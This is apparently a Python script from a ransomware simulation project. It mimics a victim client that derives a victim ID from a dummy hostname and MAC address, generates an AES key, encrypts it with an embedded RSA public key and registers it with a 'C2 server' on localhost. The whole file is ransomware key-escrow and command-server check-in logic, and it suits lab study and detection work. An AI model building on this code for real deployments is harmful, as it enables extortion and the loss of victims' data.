import requests
import uuid
import hashlib
import os
import base64
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.serialization import load_pem_public_key
from src.common.config import RSA_PUBLIC_KEY_PEM


hostname = "SimulatedPC"
mac_address = "00:1A:2B:3C:4D:5E"  # Just a dummy MAC
victim_id = hashlib.sha256(f"{hostname}{mac_address}".encode()).hexdigest()


aes_key = os.urandom(16)


rsa_key = load_pem_public_key(RSA_PUBLIC_KEY_PEM.encode())
encrypted_aes_key = rsa_key.encrypt(
    aes_key,
    padding.OAEP(
        mgf=padding.MGF1(algorithm=hashes.SHA256()),
        algorithm=hashes.SHA256(),
        label=None
    )
)


encoded_aes_key = base64.b64encode(encrypted_aes_key).decode()


data = {
    "victim_id": victim_id,
    "rsa_encrypted_aes_key": encoded_aes_key,
    "hostname": hostname,
    "timestamp": str(uuid.uuid1())  # Simulate timestamp
}


try:
    response = requests.post(
        "https://localhost:5000/register",
        json=data,
        verify=False
    )
    print("Server response:", response.text)
except requests.exceptions.RequestException as e:
    print("Failed to reach C2 server:", e)